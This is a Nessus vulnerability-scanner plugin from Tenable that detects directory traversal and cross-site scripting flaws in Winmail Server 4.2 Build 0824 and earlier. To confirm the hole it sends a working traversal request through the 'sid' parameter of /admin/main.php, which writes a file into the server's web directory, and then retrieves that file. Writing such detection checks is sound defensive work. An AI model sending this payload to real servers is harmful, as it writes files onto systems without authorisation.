#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20227);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/11/02 20:50:26 $");

  script_cve_id("CVE-2005-3692", "CVE-2005-3811");
  script_bugtraq_id(15493);
  script_osvdb_id(20925, 20926, 20927, 20928);

  script_name(english:"Winmail Server <= 4.2 Build 0824 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in Winmail Server <= 4.2 Build 0824");

  script_set_attribute(attribute:"synopsis", value:
"The remote webmail server is affected by directory traversal and
cross-site scripting vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Winmail Server, a commercial mail server for
Windows from AMAX Information Technologies. 

The web interface that is used by Winmail Server for reading mail and
administering the server fails to sanitize user-supplied input to
various parameters and scripts.  Beyond the usual cross-site scripting
attacks, this can also be leveraged by an unauthenticated attacker to
overwrite arbitrary files on the affected system, which could compromise
the system's integrity.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Nov/588");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:amax_information_technologies:magic_winmail_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 6080, 6443);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:6080);
# if (!get_port_state(port)) port = get_http_port(default:6443);

# Unless we're paranoid, make sure the banner looks like Winmail Server.
if (report_paranoia < 2) {
  res = http_get_cache(item:"/index.php", port:port, exit_on_fail: 1);
  if (
    "<title>WebMail | Powered by Winmail Server" >!< res
  ) exit(0);
}


# Try to exploit one of the flaws to create a special session file.
#
# nb: we don't have control a lot of control over the file contents,
#     but we can append a NULL byte to the value and avoid having
#     ".sess" appended to the filename.
file = string(SCRIPT_NAME, "_", rand_str());
u = string(
    "/admin/main.php?",
    # nb: put it where we can access it.
    "sid=../../www/admin/", file
  );
r = http_send_recv3(method: "GET", port:port, item: u, exit_on_fail: 0);
# nb: the server won't return anything.
#if (res == NULL) exit(0);


# Now try to retrieve our session file.
u = string("/admin/", file, ".sess");
r = http_send_recv3(method: "GET", port:port, item: u, exit_on_fail: 1);


# There's a problem if the result looks like a session file.
session = base64_decode(str: r[2]);
if (session && 'a:3:{s:4:"user";N;s:4:"pass";' >< session) {
  if (report_verbosity > 0) {
    report = string(
      "Nessus was able to create the following file on the remote host,\n",
      "under the directory in which Winmail Server is installed:\n",
      "\n",
      "  server\\webmail\\www\\admin\\", file, ".sess\n"
    );
  }
  else report = NULL;

  security_warning(port:port, extra: report);
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  exit(0);
}
